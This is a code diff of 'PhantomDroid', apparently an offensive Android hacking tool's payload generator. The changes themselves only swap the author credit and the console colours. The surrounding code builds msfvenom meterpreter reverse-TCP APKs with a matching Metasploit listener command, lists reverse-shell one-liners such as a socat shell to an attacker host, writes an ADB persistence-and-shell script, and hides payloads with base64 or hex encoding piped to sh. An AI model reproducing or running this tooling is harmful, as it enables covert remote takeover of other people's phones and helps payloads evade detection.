@@ -1,6 +1,6 @@
 """
 PhantomDroid — Payload Generator Module
-Author: Mr. Psycho | @the_psycho_of_hackers
+Author: Cipher-Ghost
 """
 
 import subprocess
@@ -36,37 +36,37 @@ def generate_msfvenom_apk(lhost: str, lport: int, payload_type: str = "reverse_t
     }
 
     if not _check_tool("msfvenom"):
-        console.print("[bold red]✗ msfvenom not found![/] Install Metasploit Framework first.")
+        console.print("[bold #8b5cf6]✗ msfvenom not found![/] Install Metasploit Framework first.")
         console.print("[dim]Showing command that would be run:[/]")
         payload = payload_map.get(payload_type, "android/meterpreter/reverse_tcp")
         cmd_str = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output}"
-        console.print(Panel(cmd_str, title="[bold]msfvenom Command[/]", border_style="yellow"))
+        console.print(Panel(cmd_str, title="[bold #3b82f6]msfvenom Command[/]", border_style="#7c3aed"))
         return None
 
     payload = payload_map.get(payload_type, "android/meterpreter/reverse_tcp")
     cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-o", output]
 
     console.print(Panel(
-        f"[bold cyan]Generating APK payload[/]\n"
+        f"[bold #3b82f6]Generating APK payload[/]\n"
         f"  Payload:  {payload}\n"
         f"  LHOST:    {lhost}\n"
         f"  LPORT:    {lport}\n"
         f"  Output:   {output}",
-        border_style="red"))
+        border_style="#7c3aed"))
 
-    with console.status("[cyan]Running msfvenom...[/]"):
+    with console.status("[#3b82f6]Running msfvenom...[/]"):
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
 
     if result.returncode == 0 and os.path.exists(output):
         size = os.path.getsize(output)
-        console.print(f"[bold green]✓ APK generated:[/] {output} ({size} bytes)")
+        console.print(f"[#3b82f6]✓ APK generated:[/] {output} ({size} bytes)")
         console.print(Panel(
-            f"[bold cyan]Start Metasploit listener:[/]\n"
+            f"[bold #3b82f6]Start Metasploit listener:[/]\n"
             f"  msfconsole -q -x 'use multi/handler; "
             f"set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run'",
-            border_style="green"))
+            border_style="#3b82f6"))
     else:
-        console.print(f"[red]✗ msfvenom failed:[/] {result.stderr}")
+        console.print(f"[#8b5cf6]✗ msfvenom failed:[/] {result.stderr}")
     return output
 
 
@@ -86,7 +86,7 @@ def generate_intent_payload(action: str, component: str = None, data: str = None
             cmd += ["-f", f]
 
     payload = " ".join(cmd)
-    console.print(Panel(payload, title="[bold cyan]Intent Payload[/]", border_style="cyan"))
+    console.print(Panel(payload, title="[bold #3b82f6]Intent Payload[/]", border_style="#7c3aed"))
     return payload
 
 
@@ -101,9 +101,9 @@ def generate_reverse_shell_commands(lhost: str, lport: int) -> list:
         ("socat",            f"socat exec:'/system/bin/sh -i',pty,stderr tcp:{lhost}:{lport}"),
     ]
 
-    table = Table(title=f"[bold red]💥 Reverse Shell Payloads → {lhost}:{lport}[/]",
-                  box=box.SIMPLE_HEAVY, border_style="red", header_style="bold red")
-    table.add_column("Method", style="cyan", width=16)
+    table = Table(title=f"[bold #8b5cf6]💥 Reverse Shell Payloads → {lhost}:{lport}[/]",
+                  box=box.SIMPLE_HEAVY, border_style="#3b82f6", header_style="bold #8b5cf6")
+    table.add_column("Method", style="#3b82f6", width=16)
     table.add_column("Command", style="white")
     for method, cmd in shells:
         table.add_row(method, cmd)
@@ -117,7 +117,7 @@ def generate_adb_payload_script(device_id: str = None, lhost: str = "10.0.0.1",
     script_lines = [
         "#!/bin/bash",
         f"# PhantomDroid — ADB Persist & Shell Payload",
-        f"# Author: Mr. Psycho | @the_psycho_of_hackers",
+        f"# Author: Cipher-Ghost",
         f"# Target: {'DEVICE_ID' if not device_id else device_id}",
         f"# LHOST: {lhost}  LPORT: {lport}",
         "",
@@ -154,7 +154,7 @@ def generate_adb_payload_script(device_id: str = None, lhost: str = "10.0.0.1",
     with open(output, "w") as f:
         f.write("\n".join(script_lines))
     os.chmod(output, 0o755)
-    console.print(f"[bold green]✓ ADB payload script written:[/] {output}")
+    console.print(f"[#3b82f6]✓ ADB payload script written:[/] {output}")
     return output
 
 
@@ -164,8 +164,8 @@ def obfuscate_payload(payload: str, method: str = "base64") -> str:
         encoded = base64.b64encode(payload.encode()).decode()
         obfuscated = f"echo {encoded} | base64 -d | sh"
         console.print(Panel(
-            f"[bold cyan]Original:[/] {payload}\n\n[bold green]Obfuscated (base64):[/] {obfuscated}",
-            title="[bold]Payload Obfuscation[/]", border_style="cyan"))
+            f"[bold #3b82f6]Original:[/] {payload}\n\n[bold #8b5cf6]Obfuscated (base64):[/] {obfuscated}",
+            title="[bold #8b5cf6]Payload Obfuscation[/]", border_style="#3b82f6"))
         return obfuscated
 
     elif method == "hex":
@@ -174,8 +174,8 @@ def obfuscate_payload(payload: str, method: str = "base64") -> str:
         hex_str = "\\x" + "\\x".join(pairs)
         obfuscated = f"echo -e '{hex_str}' | sh"
         console.print(Panel(
-            f"[bold cyan]Original:[/] {payload}\n\n[bold green]Obfuscated (hex):[/] {obfuscated}",
-            title="[bold]Payload Obfuscation[/]", border_style="cyan"))
+            f"[bold #3b82f6]Original:[/] {payload}\n\n[bold #8b5cf6]Obfuscated (hex):[/] {obfuscated}",
+            title="[bold #8b5cf6]Payload Obfuscation[/]", border_style="#3b82f6"))
         return obfuscated
 
     return payload
@@ -191,9 +191,9 @@ def payload_menu():
         ("5", "Obfuscate Payload (base64/hex)"),
         ("0", "Back"),
     ]
-    t = Table(title="[bold red]🎯 Payload Generator[/]", box=box.DOUBLE_EDGE,
-              border_style="red", header_style="bold red")
-    t.add_column("Option", style="cyan", width=6)
+    t = Table(title="[bold #8b5cf6]🎯 Payload Generator[/]", box=box.DOUBLE_EDGE,
+              border_style="#3b82f6", header_style="bold #8b5cf6")
+    t.add_column("Option", style="#3b82f6", width=6)
     t.add_column("Module", style="white")
     for num, desc in options:
         t.add_row(f"[{num}]", desc)
